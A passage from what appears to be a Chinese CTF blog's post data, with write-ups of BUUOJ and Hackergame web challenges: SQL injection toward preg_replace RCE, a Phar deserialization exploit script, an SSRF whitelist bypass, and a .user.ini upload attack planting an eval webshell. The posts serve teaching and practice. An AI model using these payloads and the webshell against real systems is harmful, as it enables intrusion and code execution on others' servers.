article的title直接用的\\(row[&#39;title&#39;]，而\\)row是通过SQL查询赋的值，这里可能造成二次注入，但是目前还不知道有什么用。replace.php貌似也是修改的页面，不过加了个VIP条件限制，以及有一行很有趣的东西： 12345if ($_SESSION[&#x27;id&#x27;] == $row[&#x27;userid&#x27;]) &#123; if (isset($_POST[&#x27;regex&#x27;]) &amp;&amp; $_POST[&#x27;regex&#x27;] == &#x27;1&#x27;) &#123; $content = addslashes(preg_replace(&quot;/&quot; . $_POST[&#x27;find&#x27;] . &quot;/&quot;, $_POST[&#x27;replace&#x27;], $row[&#x27;content&#x27;])); $sql-&gt;query(&quot;update article set content=&#x27;$content&#x27; where id=&quot; . $row[&#x27;id&#x27;] . &quot;;&quot;); exit(&quot;&lt;script&gt;alert(&#x27;Replaced successfully.&#x27;);location.href=&#x27;index.php&#x27;;&lt;/script&gt;&quot;); preg_replace？并且pattern我们可控，如果传个/e就RCE了。我们目标先定这里，要拿到VIP。register.php里表明了如何成为vip。 123456789if (!isset($row[&#x27;id&#x27;])) &#123; $password = md5($_POST[&#x27;password&#x27;]); $sql-&gt;query(&quot;insert into users (username,password,isvip) values (&#x27;$username&#x27;, &#x27;$password&#x27;,0);&quot;); foreach ($sql-&gt;query(&quot;select id from users where username=&#x27;$username&#x27;;&quot;) as $v) &#123; $row = $v; &#125; $sql-&gt;query(&quot;insert into article (userid,title,content) values (&quot; . $row[&#x27;id&#x27;] . &quot;, &#x27;Hello, world!&#x27;,&#x27;Welcome to babyblog. This is your first post. Edit or delete it, then start blogging!&#x27;);&quot;); exit(&quot;&lt;script&gt;alert(&#x27;Register successful.&#x27;);location.href=&#x27;login.php&#x27;;&lt;/script&gt;&quot;); &#125; 看来，我们需要通过那个二次注入来得到拥有isvip权限的用户，因为update语句的表已经定下，是没法修改的，只能查询（可以用堆叠注入）。因此攻击流程如下： graph TD A[&quot;writing.php写一篇Title包含我们恶意Payload的文章&quot;] --&gt; B B[&quot;edit.php修改刚才的文章，修改content，导致恶意Payload直接带入update，完成注入&quot;] --&gt; C C[&quot;注入成功时content会改变，否则就不变&quot;] 我们的$row['title']被放在where子句里，因此利用MySQL的特性： 然后返回看SafeFilter，过滤了一堆关键字，但是ascii substr啥的都还留着，以及^，就可以用异或注入了，具体请参考这里，简单来说就是and or的替代，条件间的真假进行异或运算。举例如下： 最后还有一个问题，edit.php里我们的title和content是经过addslashes()处理的，怎么绕？注意，我们的$row['title']是通过SQL查询来的，我们通过addslashes()处理后会在'后加\\，但是写入数据库的时候，转义又被写回去了，再次查询的时候还是1'，addslashes()形同虚设。 那么我们可以开始写脚本了。（我不是很喜欢在盲注里用二分法，为什么不多给服务器添点流量呢？ ~(≧▽≦)/~） 123 flag{55686b5f-27d2-41f6-87c4-7decc588cf7f}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"},{"name":"SQL注入","slug":"SQL注入","permalink":"http://tiaonmmn.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"二次注入","slug":"二次注入","permalink":"http://tiaonmmn.github.io/tags/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"},{"name":"异或注入","slug":"异或注入","permalink":"http://tiaonmmn.github.io/tags/%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5/"},{"name":"盲注","slug":"盲注","permalink":"http://tiaonmmn.github.io/tags/%E7%9B%B2%E6%B3%A8/"}]},{"title":"BUUOJ刷题-Web-SimplePHP","slug":"BUUOJ刷题-Web-SimplePHP","date":"2019-10-28T13:57:08.000Z","updated":"2020-03-05T07:15:52.575Z","comments":true,"path":"2019/10/28/BUUOJ刷题-Web-SimplePHP/","link":"","permalink":"http://tiaonmmn.github.io/2019/10/28/BUUOJ%E5%88%B7%E9%A2%98-Web-SimplePHP/","excerpt":"SWPU 2018 CTF的SimplePHP。 给了个查看文件和上传文件，扫目录似乎没结果。然后发现“查看文件”的URL有点东西http://ed97c7d0-1d36-4255-852f-e4b73a9fbd2b.node3.buuoj.cn/file.php?file=，LFI试一下。行吧，直接show_source了。","text":"SWPU 2018 CTF的SimplePHP。 给了个查看文件和上传文件，扫目录似乎没结果。然后发现“查看文件”的URL有点东西http://ed97c7d0-1d36-4255-852f-e4b73a9fbd2b.node3.buuoj.cn/file.php?file=，LFI试一下。行吧，直接show_source了。 index.php1234&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;); include &#x27;base.php&#x27;;?&gt; file.php1234567891011121314151617&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;); include &#x27;function.php&#x27;; include &#x27;class.php&#x27;; ini_set(&#x27;open_basedir&#x27;,&#x27;/var/www/html/&#x27;); $file = $_GET[&quot;file&quot;] ? $_GET[&#x27;file&#x27;] : &quot;&quot;; if(empty($file)) &#123; echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;; &#125; $show = new Show(); if(file_exists($file)) &#123; $show-&gt;source = $file; $show-&gt;_show(); &#125; else if (!empty($file))&#123; die(&#x27;file doesn\\&#x27;t exists.&#x27;); &#125; ?&gt; upload_file.php1234567891011121314151617181920212223242526&lt;?php include &#x27;function.php&#x27;; upload_file(); ?&gt; &lt;html&gt; &lt;head&gt; &lt;meta charest=&quot;utf-8&quot;&gt; &lt;title&gt;文件上传&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div align = &quot;center&quot;&gt; &lt;h1&gt;前端写得很low,请各位师傅见谅!&lt;/h1&gt; &lt;/div&gt; &lt;style&gt; p&#123; margin:0 auto&#125; &lt;/style&gt; &lt;div&gt; &lt;form action=&quot;upload_file.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;label for=&quot;file&quot;&gt;文件名:&lt;/label&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt; &lt;/div&gt; &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; function.php12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php //show_source(__FILE__); include &quot;base.php&quot;; header(&quot;Content-type: text/html;charset=utf-8&quot;); error_reporting(0); function upload_file_do() &#123; global $_FILES; $filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;; //mkdir(&quot;upload&quot;,0777); if(file_exists(&quot;upload/&quot; . $filename)) &#123; unlink($filename); &#125; move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename); echo &#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#x27;; &#125; function upload_file() &#123; global $_FILES; if(upload_file_check()) &#123; upload_file_do(); &#125; &#125; function upload_file_check() &#123; global $_FILES; $allowed_types = array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;); $temp = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]); $extension = end($temp); if(empty($extension)) &#123; //echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; &#125; else&#123; if(in_array($extension,$allowed_types)) &#123; return true; &#125; else &#123; echo &#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;; return false; &#125; &#125; &#125; ?&gt; base.php123456789101112131415161718192021222324252627282930&lt;?php session_start(); ?&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;web3&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css&quot;&gt; &lt;script src=&quot;https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;nav class=&quot;navbar navbar-default&quot; role=&quot;navigation&quot;&gt; &lt;div class=&quot;container-fluid&quot;&gt; &lt;div class=&quot;navbar-header&quot;&gt; &lt;a class=&quot;navbar-brand&quot; href=&quot;index.php&quot;&gt;首页&lt;/a&gt; &lt;/div&gt; &lt;ul class=&quot;nav navbar-nav navbra-toggle&quot;&gt; &lt;li class=&quot;active&quot;&gt;&lt;a href=&quot;file.php?file=&quot;&gt;查看文件&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;upload_file.php&quot;&gt;上传文件&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;ul class=&quot;nav navbar-nav navbar-right&quot;&gt; &lt;li&gt;&lt;a href=&quot;index.php&quot;&gt;&lt;span class=&quot;glyphicon glyphicon-user&quot;&gt;&lt;/span&gt;&lt;?php echo $_SERVER[&#x27;REMOTE_ADDR&#x27;];?&gt;&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/nav&gt; &lt;/body&gt; &lt;/html&gt; &lt;!--flag is in f1ag.php--&gt; class.php12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879&lt;?phpclass C1e4r&#123; public $test; public $str; public function __construct($name) &#123; $this-&gt;str = $name; &#125; public function __destruct() &#123; $this-&gt;test = $this-&gt;str; echo $this-&gt;test; &#125;&#125;class Show&#123; public $source; public $str; public function __construct($file) &#123; $this-&gt;source = $file; //$this-&gt;source = phar://phar.jpg echo $this-&gt;source; &#125; public function __toString() &#123; $content = $this-&gt;str[&#x27;str&#x27;]-&gt;source; return $content; &#125; public function __set($key,$value) &#123; $this-&gt;$key = $value; &#125; public function _show() &#123; if(preg_match(&#x27;/http|https|file:|gopher|dict|\\.\\.|f1ag/i&#x27;,$this-&gt;source)) &#123; die(&#x27;hacker!&#x27;); &#125; else &#123; highlight_file($this-&gt;source); &#125; &#125; public function __wakeup() &#123; if(preg_match(&quot;/http|https|file:|gopher|dict|\\.\\./i&quot;, $this-&gt;source)) &#123; echo &quot;hacker~&quot;; $this-&gt;source = &quot;index.php&quot;; &#125; &#125;&#125;class Test&#123; public $file; public $params; public function __construct() &#123; $this-&gt;params = array(); &#125; public function __get($key) &#123; return $this-&gt;get($key); &#125; public function get($key) &#123; if(isset($this-&gt;params[$key])) &#123; $value = $this-&gt;params[$key]; &#125; else &#123; $value = &quot;index.php&quot;; &#125; return $this-&gt;file_get($value); &#125; public function file_get($value) &#123; $text = base64_encode(file_get_contents($value)); return $text; &#125;&#125;?&gt; OK，flag在f1ag.php中，也读不出来内容（废话）。看源码吧，我比较感兴趣file.php，先从那里看起。open_basedir限制在/var/www/html下，然后new Show()，这个Show来自class.php。_show方法要求传的file参数不能出现http、https、file:、gopher、dict、..、f1ag，然后highlight_file，并且还有一个__wakeup方法，同样的限制。暂时没别的看点，回过头看上传。限制扩展名为gif、jpeg、jpg、png，符合条件，就会重命名文件，放到upload目录下。似乎也没什么利用点。 那还是回过头来继续翻class.php吧。Test类稍微有点东西，自定义了__get魔术方法，返回file_get函数的返回值，而file_get()用到了file_get_contents()，由于Phar考的有点多，自然而然就会向那方面去想，同时我们可以上传图片文件，思路看起来没错。 关于Phar反序列化的问题，重点参考这里。我们目前需要能够触发反序列化的点，然后就在file.php里找到了，第11行的file_exists，这个能够触发Phar。 下面构造反序列化链。首先肯定，Show这个类是核心，要用它穿起来C1e4r和Test类，怎么穿？Show类自定义了一个__toString()方法，其中的\\(content很有意思。`\\)content = \\(this-&gt;str[&#39;str&#39;]-&gt;source;`，我们需要让\\)this-&gt;str['str']成为某个类，联想到Test类又自定义了__get方法，如果\\(this-&gt;str[&#39;str&#39;]是Test类会怎样？我们将Test类中的\\)params[source]设置成f1ag.php，而source变量并不存在Test类中，那么就会返回file_get(f1ag.php)==base64_encode(file_get_conents('f1ag.php'))。看起来很可行。 还有一个问题，Show类的__toString()如何触发？我们需要一个能够echo字符串的点，就在C1e4r的__destruct()里有个echo $this-&gt;test;。貌似没什么问题了，总结一下我们的攻击流程： A[&quot;C1e4r类触发Show类的\\_\\_toString()&quot;] --&gt; B B[&quot;Show类触发Test类的\\_\\_get()&quot;] --&gt; C C[&quot;Test类预先设置好值，\\_\\_get(source)的时候会file_get_contents()，得到flag&quot;] OK，写代码吧。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?phpclass C1e4r&#123; public $test; public $str;&#125;class Show&#123; public $source; public $str;&#125;class Test&#123; public $file; public $params = array(&#x27;source&#x27; =&gt; &quot;/var/www/html/f1ag.php&quot;);&#125;?&gt;&lt;?php$jpeg_header_size = &quot;\\xff\\xd8\\xff\\xe0\\x00\\x10\\x4a\\x46\\x49\\x46\\x00\\x01\\x01\\x01\\x00\\x48\\x00\\x48\\x00\\x00\\xff\\xfe\\x00\\x13&quot; . &quot;\\x43\\x72\\x65\\x61\\x74\\x65\\x64\\x20\\x77\\x69\\x74\\x68\\x20\\x47\\x49\\x4d\\x50\\xff\\xdb\\x00\\x43\\x00\\x03\\x02&quot; . &quot;\\x02\\x03\\x02\\x02\\x03\\x03\\x03\\x03\\x04\\x03\\x03\\x04\\x05\\x08\\x05\\x05\\x04\\x04\\x05\\x0a\\x07\\x07\\x06\\x08\\x0c\\x0a\\x0c\\x0c\\x0b\\x0a\\x0b\\x0b\\x0d\\x0e\\x12\\x10\\x0d\\x0e\\x11\\x0e\\x0b\\x0b\\x10\\x16\\x10\\x11\\x13\\x14\\x15\\x15&quot; . &quot;\\x15\\x0c\\x0f\\x17\\x18\\x16\\x14\\x18\\x12\\x14\\x15\\x14\\xff\\xdb\\x00\\x43\\x01\\x03\\x04\\x04\\x05\\x04\\x05\\x09\\x05\\x05\\x09\\x14\\x0d\\x0b\\x0d\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14&quot; . &quot;\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\xff\\xc2\\x00\\x11\\x08\\x00\\x0a\\x00\\x0a\\x03\\x01\\x11\\x00\\x02\\x11\\x01\\x03\\x11\\x01&quot; . &quot;\\xff\\xc4\\x00\\x15\\x00\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\xff\\xc4\\x00\\x14\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xda\\x00\\x0c\\x03&quot; . &quot;\\x01\\x00\\x02\\x10\\x03\\x10\\x00\\x00\\x01\\x95\\x00\\x07\\xff\\xc4\\x00\\x14\\x10\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda\\x00\\x08\\x01\\x01\\x00\\x01\\x05\\x02\\x1f\\xff\\xc4\\x00\\x14\\x11&quot; . &quot;\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda\\x00\\x08\\x01\\x03\\x01\\x01\\x3f\\x01\\x1f\\xff\\xc4\\x00\\x14\\x11\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20&quot; . &quot;\\xff\\xda\\x00\\x08\\x01\\x02\\x01\\x01\\x3f\\x01\\x1f\\xff\\xc4\\x00\\x14\\x10\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda\\x00\\x08\\x01\\x01\\x00\\x06\\x3f\\x02\\x1f\\xff\\xc4\\x00\\x14\\x10\\x01&quot; . &quot;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda\\x00\\x08\\x01\\x01\\x00\\x01\\x3f\\x21\\x1f\\xff\\xda\\x00\\x0c\\x03\\x01\\x00\\x02\\x00\\x03\\x00\\x00\\x00\\x10\\x92\\x4f\\xff\\xc4\\x00\\x14\\x11\\x01\\x00&quot; . &quot;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda\\x00\\x08\\x01\\x03\\x01\\x01\\x3f\\x10\\x1f\\xff\\xc4\\x00\\x14\\x11\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda&quot; . &quot;\\x00\\x08\\x01\\x02\\x01\\x01\\x3f\\x10\\x1f\\xff\\xc4\\x00\\x14\\x10\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda\\x00\\x08\\x01\\x01\\x00\\x01\\x3f\\x10\\x1f\\xff\\xd9&quot;;$phar = new Phar(&quot;phar.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);$phar-&gt;setStub($jpeg_header_size . &quot; __HALT_COMPILER(); ?&gt;&quot;);$test_show = new Show(&#x27;index.php&#x27;);$test_test = new Test();$test_c14er = new C1e4r($test_show);$test_show-&gt;str = array(&quot;str&quot; =&gt; $test_test);$test_c14er-&gt;str = $test_show;$phar-&gt;setMetadata($test_c14er);var_dump($phar-&gt;getMetadata());$phar-&gt;stopBuffering();?&gt; 一定要把源文件中乱七八糟的魔术方法都删掉，否则会影响Phar文件生成。 然后上传，算出文件名，file.php那里用phar://协议去读jpg文件就OK了，会返回Base64，解密就是Flag。 flag{5a74c4b5-eb9c-44fc-a65f-91e37e1cf8bd}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Unserialize","slug":"Unserialize","permalink":"http://tiaonmmn.github.io/tags/Unserialize/"},{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"},{"name":"Phar","slug":"Phar","permalink":"http://tiaonmmn.github.io/tags/Phar/"}]},{"title":"USTC-Hackergame-2019-网页读取器","slug":"USTC-Hackergame-2019-网页读取器","date":"2019-10-26T13:51:10.000Z","updated":"2019-12-10T12:15:12.677Z","comments":true,"path":"2019/10/26/USTC-Hackergame-2019-网页读取器/","link":"","permalink":"http://tiaonmmn.github.io/2019/10/26/USTC-Hackergame-2019-%E7%BD%91%E9%A1%B5%E8%AF%BB%E5%8F%96%E5%99%A8/","excerpt":"很明显的，在考察SSRF，然后有源码：","text":"很明显的，在考察SSRF，然后有源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556from flask import Flask, render_template, request, send_from_directoryimport requests # well, requests is designed for humans, and I like it.app = Flask(__name__)whitelist_hostname = [&quot;example.com&quot;, &quot;www.example.com&quot;]whitelist_scheme = [&quot;http://&quot;]def check_hostname(url): for i in whitelist_scheme: if url.startswith(i): url = url[len(i):] # strip scheme url = url[url.find(&quot;@&quot;) + 1:] # strip userinfo if not url.find(&quot;/&quot;) == -1: url = url[:url.find(&quot;/&quot;)] # strip parts after authority if not url.find(&quot;:&quot;) == -1: url = url[:url.find(&quot;:&quot;)] # strip port if url not in whitelist_hostname: return (False, &quot;hostname &#123;&#125; not in whitelist&quot;.format(url)) return (True, &quot;ok&quot;) return (False, &quot;scheme not in whitelist, only &#123;&#125; allowed&quot;.format(whitelist_scheme))@app.route(&quot;/&quot;)def index(): return render_template(&quot;index.html&quot;)@app.route(&quot;/request&quot;)def req_route(): url = request.args.get(&#x27;url&#x27;) status, msg = check_hostname(url) if status is False: # print(msg) return msg try: r = requests.get(url, timeout=2) if not r.status_code == 200: return &quot;We tried accessing your url, but it does not return HTTP 200. Instead, it returns &#123;&#125;.&quot;.format(r.status_code) return r.text except requests.Timeout: return &quot;We tried our best, but it just timeout.&quot; except requests.RequestException: return &quot;While accessing your url, an exception occurred. There may be a problem with your url.&quot;@app.route(&quot;/source&quot;)def get_source(): # return &quot;While accessing your url, an exception occurred. There may be a problem with your url.&quot; return send_from_directory(&quot;static/&quot;, &quot;app.py&quot;, as_attachment=True)if __name__ == &#x27;__main__&#x27;: app.run(&quot;0.0.0.0&quot;, 8000, debug=False) 我们提交url，过check_hostname()检测后就会用requests.get()得到response.text。那么我们来看一下check_hostname()。它没有使用urllib，而是自己写了一套逻辑，大概率就是这里有问题了。 首先去掉了\"http://\"，然后去掉了\"@\"之前的所有东西，去掉了第一个\"/\"之后的所有东西，还去掉了第一个\":\"之后的所有东西，最后剩余了理所当然就是主机名了。如果不在whitelist_hostname里就return False。 看起来没什么问题。这题的考点在于URL组成部分里可以有其他的东西，来源与🍊在Blackhat上的演讲： 如果我们在URL中加入#或者?，它们后面的内容默认是全部丢弃的。可参考如下： 因此我们构造Payload为：http://web1/flag#@example.com，requests.get()在处理带#的URL，会将#后面的所有内容丢弃，但是check_hostname()没有检查#，我们用@掩盖之前的所有内容，并加入example.com通过检查。把#换成?也可以。 flag{dda3fd30-7ad6-4b70-926d-02ee8bc81ca6}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"Python","slug":"Python","permalink":"http://tiaonmmn.github.io/tags/Python/"}]},{"title":"BUUOJ刷题-Web-Checkin","slug":"BUUOJ刷题-Web-Checkin","date":"2019-10-24T12:06:12.000Z","updated":"2019-12-10T12:15:12.595Z","comments":true,"path":"2019/10/24/BUUOJ刷题-Web-Checkin/","link":"","permalink":"http://tiaonmmn.github.io/2019/10/24/BUUOJ%E5%88%B7%E9%A2%98-Web-Checkin/","excerpt":"SUCTF 2019的Checkin。 打开后让我们上传文件。只允许图片格式的扩展名，且不能在文件内出现&lt;?。如果我们强行修改扩展名，会提示exif_imagetype:not image!，而成功上传后返回了一些东西。","text":"SUCTF 2019的Checkin。 打开后让我们上传文件。只允许图片格式的扩展名，且不能在文件内出现&lt;?。如果我们强行修改扩展名，会提示exif_imagetype:not image!，而成功上传后返回了一些东西。 对于&lt;?的检测，我们可以用&lt;script language='php'&gt;绕过，但是这种写法在PHP7以后就废弃了。而对于exif_imagetype的检测我们把文件头写对就可以了，但是我们没法绕过扩展名。 这个时候想到可不可以用.htaccess造一个PHP木马呢？BUUOJ平台显示不出来原平台是什么，SUCTF 2019比赛的时候用的是Nginx。上网搜了一下，找到这个，.user.ini，这个是PHP用来覆盖设置全局php.ini的。关于user.ini后门，请参考这个 。 那么我们试一下能不能上传.ini的文件。绕过exif_imagetype，我们可以用WBMP，文件头类似于\"8a8a0a\"。具体请参考这个。 那么，我们上传.user.ini，内容为auto_prepend_file=1.jpg。而1.jpg我们先假定PHP版本没有到7，用script绕过。我们上传的文件会定时删除，所以上脚本（偷个懒用burpsuite的copy as requests写的，有点糟糕）。 12345678910111213import requestsburp0_url = &quot;http://6cb9ce65-e9c3-4d2b-8250-1d1aea0ad498.node3.buuoj.cn:80/index.php&quot;burp0_cookies = &#123;&quot;_ga&quot;: &quot;GA1.2.955320724.1570284537&quot;&#125;burp0_headers = &#123;&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Origin&quot;: &quot;http://6cb9ce65-e9c3-4d2b-8250-1d1aea0ad498.node3.buuoj.cn&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=----WebKitFormBoundaryQLCUc5tPaf34BcAx&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&quot;, &quot;Referer&quot;: &quot;http://6cb9ce65-e9c3-4d2b-8250-1d1aea0ad498.node3.buuoj.cn/&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;&#125;burp0_data = &quot;------WebKitFormBoundaryQLCUc5tPaf34BcAx\\r\\nContent-Disposition: form-data; name=\\&quot;fileUpload\\&quot;; filename=\\&quot;.user.ini\\&quot;\\r\\nContent-Type: image/jpeg\\r\\n\\r\\n\\x00\\x00\\x8a9\\x8a9\\n\\nauto_prepend_file=shell2.png\\r\\n------WebKitFormBoundaryQLCUc5tPaf34BcAx\\r\\nContent-Disposition: form-data; name=\\&quot;upload\\&quot;\\r\\n\\r\\n\\xe6\\x8f\\x90\\xe4\\xba\\xa4\\r\\n------WebKitFormBoundaryQLCUc5tPaf34BcAx--\\r\\n&quot;requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)burp0_url = &quot;http://6cb9ce65-e9c3-4d2b-8250-1d1aea0ad498.node3.buuoj.cn:80/index.php&quot;burp0_cookies = &#123;&quot;_ga&quot;: &quot;GA1.2.955320724.1570284537&quot;&#125;burp0_headers = &#123;&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Origin&quot;: &quot;http://6cb9ce65-e9c3-4d2b-8250-1d1aea0ad498.node3.buuoj.cn&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=----WebKitFormBoundaryfnkiDtoqTZyrzBuQ&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&quot;, &quot;Referer&quot;: &quot;http://6cb9ce65-e9c3-4d2b-8250-1d1aea0ad498.node3.buuoj.cn/index.php&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;&#125;burp0_data = &quot;------WebKitFormBoundaryfnkiDtoqTZyrzBuQ\\r\\nContent-Disposition: form-data; name=\\&quot;fileUpload\\&quot;; filename=\\&quot;shell2.png\\&quot;\\r\\nContent-Type: image/png\\r\\n\\r\\n\\x00\\x00\\x8a9\\x8a9\\n\\n&lt;script language=&#x27;php&#x27;&gt;eval($_POST[&#x27;cmd&#x27;]);&lt;/script&gt;\\r\\n------WebKitFormBoundaryfnkiDtoqTZyrzBuQ\\r\\nContent-Disposition: form-data; name=\\&quot;upload\\&quot;\\r\\n\\r\\n\\xe6\\x8f\\x90\\xe4\\xba\\xa4\\r\\n------WebKitFormBoundaryfnkiDtoqTZyrzBuQ--\\r\\n&quot;print(requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data).text) 得到访问目录，然后直接POST传包就可以了。 flag{5f75c6f5-851f-4a39-8335-8901d13bbf84}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"},{"name":".user.ini","slug":"user-ini","permalink":"http://tiaonmmn.github.io/tags/user-ini/"},{"name":"Upload","slug":"Upload","permalink":"http://tiaonmmn.github.io/tags/Upload/"}]},{"title":"CSAW-Quals-2019-byte_me","slug":"CSAW-Quals-2019-byte-me","date":"2019-10-21T12:17:02.000Z","updated":"2019-12-10T12:15:12.609Z","comments":true,"path":"2019/10/21/CSAW-Quals-2019-byte-me/","link":"","permalink":"http://tiaonmmn.github.io/2019/10/21/CSAW-Quals-2019-byte-me/","excerpt":"这道题没给文件，我们连接后返回一个16进制数，然后让我们input something。我们重复输入一个字符串返回相同结果。每当输入的字符串增加16位，返回的结果增加32位。这一条可以确定这个加密方式应该是某种块加密。最容易想到的就是AES了。那么哪种加密方式？参考这里，再观察输出的密文。","text":"这道题没给文件，我们连接后返回一个16进制数，然后让我们input something。我们重复输入一个字符串返回相同结果。每当输入的字符串增加16位，返回的结果增加32位。这一条可以确定这个加密方式应该是某种块加密。最容易想到的就是AES了。那么哪种加密方式？参考这里，再观察输出的密文。 12345678910111213141516171819from pwn import *import stringimport random# context.log_level=&#x27;debug&#x27;s = connect(&#x27;127.0.0.1&#x27;, 